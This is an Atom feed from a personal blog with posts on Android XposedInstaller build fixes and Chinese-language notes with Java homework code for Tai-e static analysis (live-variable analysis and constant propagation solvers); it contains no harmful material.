<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wd-z711&#39;s B10g</title>
  
  <subtitle>wd-z711&#39;s B10g</subtitle>
  <link href="https://wd-2711.tech/atom.xml" rel="self"/>
  
  <link href="https://wd-2711.tech/"/>
  <updated>2023-12-26T13:18:43.276Z</updated>
  <id>https://wd-2711.tech/</id>
  
  <author>
    <name>wd-z711</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>blockchain-distribute-tech</title>
    <link href="https://wd-2711.tech/2023/12/20/blockchain-distribute-tech/"/>
    <id>https://wd-2711.tech/2023/12/20/blockchain-distribute-tech/</id>
    <published>2023-12-20T09:09:03.000Z</published>
    <updated>2023-12-26T13:18:43.276Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7ccda615b0bfb4c0a8cf14d07767b391c9007d50e82516ffbbe33b75c650620b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="blockchain" scheme="https://wd-2711.tech/categories/blockchain/"/>
    
    
  </entry>
  
  <entry>
    <title>some-bugs-fix</title>
    <link href="https://wd-2711.tech/2023/12/05/some-bugs-fix/"/>
    <id>https://wd-2711.tech/2023/12/05/some-bugs-fix/</id>
    <published>2023-12-05T12:38:28.000Z</published>
    <updated>2023-12-06T13:48:23.028Z</updated>
    
    <content type="html"><![CDATA[<h1 id="some-bugs-and-fix-method"><a href="#some-bugs-and-fix-method" class="headerlink" title="some bugs and fix method"></a>some bugs and fix method</h1><p>From this page, I decide use EN to continue my blog.</p><h2 id="Build-XposedInstaller-using-gradle"><a href="#Build-XposedInstaller-using-gradle" class="headerlink" title="Build XposedInstaller using gradle"></a>Build XposedInstaller using gradle</h2><p>When use android studio and build gradle, even I have downgrade JDK to 1.8, and close android studio proxy, also have mistakes. Gradle’s information is below:</p><span id="more"></span><p><img src="/images/some-bugs-fix/image-20231205211039305.png" alt="image-20231205211039305" style="zoom:67%;" /></p><p>Mistakes are below:</p><p><img src="/images/some-bugs-fix/image-20231205211148627.png" alt="image-20231205211148627" style="zoom:67%;" /></p><p><img src="/images/some-bugs-fix/image-20231205211226541.png" alt="image-20231205211226541" style="zoom:67%;" /></p><p>Source code from <a href="https://github.com/rovo89/XposedInstaller/">link</a>.</p><p>Solution: downgrade android studio to <code>android-studio-ide-201.6858069</code>.</p><p>Build XposedInstaller using gradle</p><h2 id="Flash-machine"><a href="#Flash-machine" class="headerlink" title="Flash machine"></a>Flash machine</h2><p>Question: when flash machine, show <code>waiting for any device</code>.</p><p>Solution: <a href="https://www.jianshu.com/p/f34cdd4cce04">link</a>.</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;some-bugs-and-fix-method&quot;&gt;&lt;a href=&quot;#some-bugs-and-fix-method&quot; class=&quot;headerlink&quot; title=&quot;some bugs and fix method&quot;&gt;&lt;/a&gt;some bugs and fix method&lt;/h1&gt;&lt;p&gt;From this page, I decide use EN to continue my blog.&lt;/p&gt;
&lt;h2 id=&quot;Build-XposedInstaller-using-gradle&quot;&gt;&lt;a href=&quot;#Build-XposedInstaller-using-gradle&quot; class=&quot;headerlink&quot; title=&quot;Build XposedInstaller using gradle&quot;&gt;&lt;/a&gt;Build XposedInstaller using gradle&lt;/h2&gt;&lt;p&gt;When use android studio and build gradle, even I have downgrade JDK to 1.8, and close android studio proxy, also have mistakes. Gradle’s information is below:&lt;/p&gt;</summary>
    
    
    
    <category term="杂记" scheme="https://wd-2711.tech/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>tai_e-static-analysis-with-homework</title>
    <link href="https://wd-2711.tech/2023/11/15/tai-e-static-analysis-with-homework/"/>
    <id>https://wd-2711.tech/2023/11/15/tai-e-static-analysis-with-homework/</id>
    <published>2023-11-15T12:40:20.000Z</published>
    <updated>2023-12-02T08:13:58.707Z</updated>
    
    <content type="html"><![CDATA[<h1 id="软件分析基础知识-amp-作业"><a href="#软件分析基础知识-amp-作业" class="headerlink" title="软件分析基础知识&amp;作业"></a>软件分析基础知识&amp;作业</h1><p>&emsp;之前翔哥给我具体讲了讲软件分析的基础知识，翔哥的链接如下所示：</p><p>[1] <a href="https://xym4ster.github.io/post/Program-Analysis-01">https://xym4ster.github.io/post/Program-Analysis-01</a></p><p>[2] <a href="https://xym4ster.github.io/post/Program-Analysis-02">https://xym4ster.github.io/post/Program-Analysis-02</a></p><p>[3] <a href="https://xym4ster.github.io/post/Program-Analysis-03">https://xym4ster.github.io/post/Program-Analysis-03</a></p><p>[4] <a href="https://xym4ster.github.io/post/Program-Analysis-04">https://xym4ster.github.io/post/Program-Analysis-04</a></p><p>[5] <a href="https://xym4ster.github.io/post/Program-Analysis-05">https://xym4ster.github.io/post/Program-Analysis-05</a></p><span id="more"></span><h2 id="0x00-tai-e基本知识"><a href="#0x00-tai-e基本知识" class="headerlink" title="0x00 tai-e基本知识"></a>0x00 tai-e基本知识</h2><p>&emsp;<strong>Tai-e 是一个分析 Java 程序的静态程序分析框架</strong>，相比于已有的知名静态程序分析框架（如 Soot、Wala 等），<strong>Tai-e 要易学易用</strong>。Tai-e分为教学版/科研版，它们在分析能力和性能上有较大差距。</p><p>&emsp;作业涵盖多种静态分析技术，包括编译优化（活跃变量分析、常量传播分析、死代码检测），基础程序分析（程序调用图构建、非上下文敏感指针/别名分析、各类经典上下文敏感指针/别名分析），以及程序分析在软件安全性的应用（污点分析）。</p><p>&emsp;<code>tai-e 利用 Soot 前端解析 Java 程序并帮助构建 Tai-e IR。Soot 有两个前端，分别处理 Java 源代码文件（</code>.java<code>）和字节码文件（</code>.class<code>）。其中，前者可以将源代码中的变量名保留至 IR 中，从而使得生成的 IR 更贴近源码，比后者的更易于理解，即tai-e可以输入java源代码文件或者字节码文件，都可以输出IR，但是输入java源代码文件更好。</code></p><p>&emsp;实验作业中，待分析的程序都以 Java 源文件的格式提供。然而，Soot 的 Java 源文件前端已经过时（最高 Java 7 版本）且不够健壮。Soot 的字节码文件前端更加健壮（最高 Java 17 版本编译生成的 <code>.class</code> 文件）。分析真实世界的程序时，往往使用字节码。</p><h2 id="0x01-活跃变量分析与迭代求解器"><a href="#0x01-活跃变量分析与迭代求解器" class="headerlink" title="0x01 活跃变量分析与迭代求解器"></a>0x01 活跃变量分析与迭代求解器</h2><h3 id="活跃变量分析基本原理"><a href="#活跃变量分析基本原理" class="headerlink" title="活跃变量分析基本原理"></a>活跃变量分析基本原理</h3><p>&emsp;见<a href="https://xym4ster.github.io/post/Program-Analysis-02">Link</a>。</p><h3 id="代码相关的知识点"><a href="#代码相关的知识点" class="headerlink" title="代码相关的知识点"></a>代码相关的知识点</h3><ul><li><code>pascal.taie.analysis.dataflow.analysis.DataflowAnalysis</code></li></ul><p>&emsp;抽象的数据流分析类，是具体的数据流分析与求解器之间的接口，即具体的数据流分析（如活跃变量分析）需要实现它的接口，而求解器（如迭代求解器）需要通过它的接口来求解数据流。分析方向、边界条件、初始条件、meet 操作、transfer 函数。</p><ul><li><code>pascal.taie.ir.exp.Exp</code></li></ul><p>&emsp;表示程序中的所有表达式。它含有很多子类，对应各类具体的表达式。在 Tai-e 的 IR 中，把表达式分为两类：LValue 和 RValue。有些表达式既可用于左值，也可用于右值，就比如Var。</p><ul><li><code>pascal.taie.ir.stmt.Stmt</code></li></ul><p>&emsp;表示程序中的所有语句。<code>每个表达式都属于某条特定的语句</code>。每条语句至多只可能定义一个变量、而可能使用零或多个变量。</p><ul><li><code>pascal.taie.analysis.dataflow.fact.SetFact&lt;Var&gt;</code></li></ul><p>&emsp;此泛型类用于把 data fact 组织成一个集合。它提供了各种集合操作，如添加、删除元素，取交集、并集等。<code>data fact就是每一个basic block的输入，例如活跃变量分析，需要用0/1代表某变量是否是活跃的。</code></p><ul><li><code>pascal.taie.analysis.dataflow.fact.DataflowResult</code></li></ul><p>&emsp;维护数据流分析的 CFG 中的 fact，可以通过它的 API 获取、设置 CFG 节点的 <code>IN facts</code> 和 <code>OUT facts</code>。</p><ul><li><code>pascal.taie.analysis.graph.cfg.CFG</code></li></ul><p>&emsp;表示程序中方法的控制流图（control-flow graphs）。可以通过一个for循环遍历其中的所有节点。</p><ul><li><code>pascal.taie.analysis.dataflow.solver.Solver</code></li></ul><p>&emsp;这是数据流分析求解器的基类，包含了求解器的抽象功能。Tai-e 会构建待分析程序的 CFG 并传给 <code>Solver.solve(CFG)</code>，这个类中有两组initialize/doSolve方法，分别处理前向和后向的数据流分析。</p><h3 id="作业代码"><a href="#作业代码" class="headerlink" title="作业代码"></a>作业代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LiveVariableAnalysis.java</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> SetFact&lt;Var&gt; <span class="title function_">newBoundaryFact</span><span class="params">(CFG&lt;Stmt&gt; cfg)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SetFact</span>&lt;Var&gt;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> SetFact&lt;Var&gt; <span class="title function_">newInitialFact</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SetFact</span>&lt;Var&gt;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">meetInto</span><span class="params">(SetFact&lt;Var&gt; fact, SetFact&lt;Var&gt; target)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!fact.isEmpty())</span><br><span class="line">        target.union(fact);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">transferNode</span><span class="params">(Stmt stmt, SetFact&lt;Var&gt; in, SetFact&lt;Var&gt; out)</span> &#123;</span><br><span class="line">    Optional&lt;LValue&gt; def = stmt.getDef();</span><br><span class="line">    SetFact&lt;Var&gt; result = <span class="keyword">new</span> <span class="title class_">SetFact</span>&lt;Var&gt;();</span><br><span class="line">    Collection&lt;RValue&gt; use = stmt.getUses();</span><br><span class="line"></span><br><span class="line">    SetFact&lt;Var&gt; left = <span class="keyword">new</span> <span class="title class_">SetFact</span>&lt;Var&gt;();</span><br><span class="line">    SetFact&lt;Var&gt; right = <span class="keyword">new</span> <span class="title class_">SetFact</span>&lt;Var&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (RValue u: use) &#123;</span><br><span class="line">        <span class="keyword">if</span> (u <span class="keyword">instanceof</span> Var)</span><br><span class="line">            left.add((Var)u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!out.isEmpty()) &#123;</span><br><span class="line">        right = out.copy();</span><br><span class="line">        <span class="keyword">if</span> (def.isPresent()) &#123;</span><br><span class="line">            <span class="type">LValue</span> <span class="variable">tmp</span> <span class="operator">=</span> def.get();</span><br><span class="line">            <span class="keyword">if</span> (tmp <span class="keyword">instanceof</span> Var)</span><br><span class="line">                right.remove((Var)tmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result.union(left);</span><br><span class="line">    result.union(right);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result.equals(in)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        in.set(result);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Solver.java</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initializeBackward</span><span class="params">(CFG&lt;Node&gt; cfg, DataflowResult&lt;Node, Fact&gt; result)</span> &#123;</span><br><span class="line">    <span class="type">Node</span> <span class="variable">exit</span> <span class="operator">=</span> cfg.getExit();</span><br><span class="line">    result.setInFact(exit, analysis.newBoundaryFact(cfg));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Node n: cfg) &#123;</span><br><span class="line">        result.setInFact(n, analysis.newInitialFact());</span><br><span class="line">        result.setOutFact(n, analysis.newInitialFact());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IterativeSolver.java</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doSolveBackward</span><span class="params">(CFG&lt;Node&gt; cfg, DataflowResult&lt;Node, Fact&gt; result)</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">change</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (change) &#123;</span><br><span class="line">        change = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (Node n: cfg) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">Fact</span> <span class="variable">fact</span> <span class="operator">=</span> result.getOutFact(n);</span><br><span class="line">            <span class="keyword">for</span> (Node suc: cfg.getSuccsOf(n)) &#123;</span><br><span class="line">                <span class="type">Fact</span> <span class="variable">tmp</span> <span class="operator">=</span> result.getInFact(suc);</span><br><span class="line">                analysis.meetInto(tmp, fact);</span><br><span class="line">            &#125;</span><br><span class="line">            result.setOutFact(n, fact);</span><br><span class="line"></span><br><span class="line">            <span class="type">Fact</span> <span class="variable">in_fact</span> <span class="operator">=</span> result.getInFact(n);</span><br><span class="line">            <span class="type">Fact</span> <span class="variable">out_fact</span> <span class="operator">=</span> result.getOutFact(n);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">tmp</span> <span class="operator">=</span> analysis.transferNode(n, in_fact, out_fact);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tmp)</span><br><span class="line">                change = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-常量传播和-Worklist-求解器"><a href="#0x02-常量传播和-Worklist-求解器" class="headerlink" title="0x02 常量传播和 Worklist 求解器"></a>0x02 常量传播和 Worklist 求解器</h2><h3 id="常量传播基本原理"><a href="#常量传播基本原理" class="headerlink" title="常量传播基本原理"></a>常量传播基本原理</h3><p>&emsp;程序的P点有一个变量x，判断在P点是否可以保证x是一个常量。</p><p>&emsp;<strong>Iterative Algorithm都是前驱的block先merge完，再将结果输入到后面的block。而Worklist Algorithm是先把前驱block的输出输入到要分析的block，然后将要分析的block的输出统一merge。</strong>如下图所示，Worklist Algorithm更准：</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231122204001241.png" alt="image-20231122204001241" style="zoom:67%;" /></p><p>&emsp;<code>上一段话纯属一派胡言，经过查证，Worklist Algorithm与Iterative Algorithm与如何merge无关。</code>从下面的算法流程图来看，上图的差异应该体现在$\mathrm{IN}[B]=\bigsqcup_{P\text{ a predecessor of }B}\mathsf{OUT}[P]$这一步，如果是$\operatorname{F}(X\cap Y)$，那么$\mathrm{IN}[B]$应该是${(a,NAC),(b,NAC)}$；如果是$\mathrm{F}({X})\cap\mathrm{F}({Y})$，那么$\mathrm{IN}[B]$应该是${(a,1),(a,9),(b,1),(b,9)}$；</p><p>&emsp;如果使用Iterative Algorithm分析常量传播，那么转换函数以及相应标注如下：</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231122204345729.png" alt="image-20231122204345729" style="zoom:67%;" /></p><p>&emsp;最终的算法结构如下（与活跃变量分析不同）：</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231122204435289.png" alt="image-20231122204435289" style="zoom:67%;" /></p><p>&emsp;此算法不好的点是：如果有任意OUT变化了，所有的block都要重新计算。而对应的Worklist Algorithm为：</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231122210036239.png" alt="image-20231122210036239" style="zoom:67%;" /></p><p><code>为什么活跃变量分析是backward的，而常量分析是forward的呢？</code></p><p>&emsp;在某个点的变量是否活跃，是由后面的程序决定的。而在某个点的定义是否是常量，是由前面的程序决定的。</p><p><code>May Analysis 与 Must Analysis</code></p><p>&emsp;May Analysis的初始fact为0，最终找出有哪些不是0的fact。例如Reaching Definitions Analysis，其意思是：<code>假设有程序点p与q，在p点定义了变量x，且从p到q之间没有再定义x，那么说x的定值到达了p在此环境下，fact=0代表不可到达，fact=1代表可到达，我们想找不可达的，这样的话就可以把对应的语句删掉。May Analysis，程序满足一条路径即可。</code></p><p>&emsp;Must Analysis的初始fact为1，最终找出不是1的fact。例如Constant Propagation，其意思是：<code>有程序点p与q，在q点定义了变量x，在q点使用了变量x，q点之前，再没有分支重新定义变量x，那么fact=1代表可常量传播，fact=0代表不可常量传播，我们想找可常量传播的，这样的话就可以传播常量。Must Analysis，程序必须满足所有路径。</code></p><h3 id="代码相关的知识点-1"><a href="#代码相关的知识点-1" class="headerlink" title="代码相关的知识点"></a>代码相关的知识点</h3><p>&emsp;由于在java中，boolean/byte/char/short等类型在运行时都以int的形式进行计算，因此实现int类型的常量传播即可。其他的数据类型可以忽略。</p><p>&emsp;只需要关注以下3种语句：（1）常量，x=1；（2）变量，x=y；（3）二元运算表达式，x=a+b或者x=a&gt;&gt;b等等。其中二元运算如下：</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231123201511693.png" alt="image-20231123201511693" style="zoom:67%;" /></p><p>&emsp;对于逻辑运算符（与或），请详细看作业中的描述，就是将逻辑运算符转为语义等价的语句，并且进行处理。对于方法调用，字段load而言，进行保守的近似处理，即当作<code>x=NAC</code>。对于字段存储等其他语句而言，只需要使用恒等函数作为transfer函数即可。</p><ul><li><code>pascal.taie.ir.IR</code>。</li></ul><p>&emsp;每个实例存储了一个java方法的各种信息，例如变量、参数、语句。</p><ul><li><code>pascal.taie.ir.exp.Exp</code>。</li></ul><p>&emsp;其有很多子类，其中<code>pascal.taie.ir.exp.Var</code>代表IR中的变量，<code>pascal.taie.ir.exp.IntLiteral</code>代表程序中的整数常量。<code>pascal.taie.ir.exp.BinaryExp</code>代表程序中的二元表达式，它有很多子类，每个子类代表上表中支持的运算符，且<code>BinaryExp</code> 的两个操作数都是 <code>Var</code> 类型的。</p><ul><li><code>pascal.taie.ir.stmt.DefinitionStmt</code>。</li></ul><p>&emsp;stmt的子类，表示程序中所有赋值语句。</p><ul><li><code>pascal.taie.analysis.dataflow.analysis.DataflowAnalysis</code>。</li></ul><p>&emsp;其中有具体数据流分析算法需要实现的接口，会被求解器调用。</p><ul><li><code>pascal.taie.analysis.dataflow.analysis.constprop.Value</code>。</li></ul><p>&emsp;分析格上的抽象值，例如<code>getNAC()</code>返回 NAC，<code>getUndef()</code> 返回UNDEF，<code>makeConstant(int)</code>返回给定整数在格上对应的抽象值。</p><ul><li><code>pascal.taie.analysis.dataflow.analysis.constprop.CPFact</code>。</li></ul><p>&emsp;表示常量传播中的 data facts，即一个从变量（<code>Var</code>）到格上抽象值（<code>Value</code>）的映射。</p><ul><li><code>pascal.taie.analysis.dataflow.analysis.constprop.ConstantPropagation</code>。</li></ul><p>&emsp;实现了 <code>DataflowAnalysis</code>。</p><h3 id="作业代码-1"><a href="#作业代码-1" class="headerlink" title="作业代码"></a>作业代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// solver.java</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initializeForward</span><span class="params">(CFG&lt;Node&gt; cfg, DataflowResult&lt;Node, Fact&gt; result)</span> &#123;</span><br><span class="line">    <span class="type">Node</span> <span class="variable">entry</span> <span class="operator">=</span> cfg.getEntry();</span><br><span class="line">    <span class="type">Fact</span> <span class="variable">cp_fact</span> <span class="operator">=</span> analysis.newBoundaryFact(cfg);</span><br><span class="line">    <span class="comment">// inFact and outFact all need set</span></span><br><span class="line">    result.setOutFact(entry, cp_fact);</span><br><span class="line">    result.setInFact(entry, cp_fact);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Node n: cfg) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!cfg.isEntry(n)) &#123;</span><br><span class="line">            result.setInFact(n, analysis.newInitialFact());</span><br><span class="line">            result.setOutFact(n, analysis.newInitialFact());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// WorkListSolver.java</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doSolveForward</span><span class="params">(CFG&lt;Node&gt; cfg, DataflowResult&lt;Node, Fact&gt; result)</span> &#123;</span><br><span class="line">    Queue&lt;Node&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Node n: cfg)</span><br><span class="line">        queue.offer(n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">changed</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// pick basic block B from Worklist</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">cur</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">        <span class="comment">// IN[B] = UNION(OUT[P])</span></span><br><span class="line">        <span class="type">Fact</span> <span class="variable">fact</span> <span class="operator">=</span> result.getInFact(cur);</span><br><span class="line">        <span class="keyword">for</span> (Node pred: cfg.getPredsOf(cur)) &#123;</span><br><span class="line">            <span class="type">Fact</span> <span class="variable">tmp</span> <span class="operator">=</span> result.getOutFact(pred);</span><br><span class="line">            analysis.meetInto(tmp, fact);</span><br><span class="line">        &#125;</span><br><span class="line">        result.setInFact(cur, fact);</span><br><span class="line">        <span class="comment">// OUT[B] = genB UNION (IN[B]-killB)</span></span><br><span class="line">        <span class="type">Fact</span> <span class="variable">in_fact</span> <span class="operator">=</span> result.getInFact(cur);</span><br><span class="line">        <span class="type">Fact</span> <span class="variable">out_fact</span> <span class="operator">=</span> result.getOutFact(cur);</span><br><span class="line">        changed = analysis.transferNode(cur, in_fact, out_fact);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (changed)</span><br><span class="line">            <span class="keyword">for</span> (Node succ: cfg.getSuccsOf(cur))</span><br><span class="line">                <span class="keyword">if</span> (!queue.contains(succ))</span><br><span class="line">                    queue.offer(succ);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span 